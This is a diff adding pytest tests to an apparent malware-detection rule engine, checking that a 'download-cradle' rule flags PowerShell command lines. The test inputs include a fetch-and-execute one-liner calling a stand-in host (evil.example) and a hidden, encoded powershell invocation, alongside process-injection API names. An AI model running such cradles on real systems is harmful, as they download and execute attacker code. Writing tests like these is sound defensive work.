@@ -22,6 +22,20 @@ def test_match_records_every_hit_term():
     assert matches[0].matched_terms == ["VirtualAllocEx", "WriteProcessMemory"]
 
 
+def test_download_cradle_rule_matches_classic_one_liner():
+    matches = rules.match_rules(
+        ["IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"]
+    )
+    assert [m.rule_id for m in matches] == ["TL007"]
+    assert matches[0].category == "download-cradle"
+    assert matches[0].severity == 4
+
+
+def test_download_cradle_rule_matches_encoded_command():
+    matches = rules.match_rules(["powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgA"])
+    assert [m.rule_id for m in matches] == ["TL007"]
+
+
 def test_custom_rule_loading_is_the_live_demo_gap():
     """Guards the deliberate gap: this is what gets built during the talk."""
     with pytest.raises(NotImplementedError):
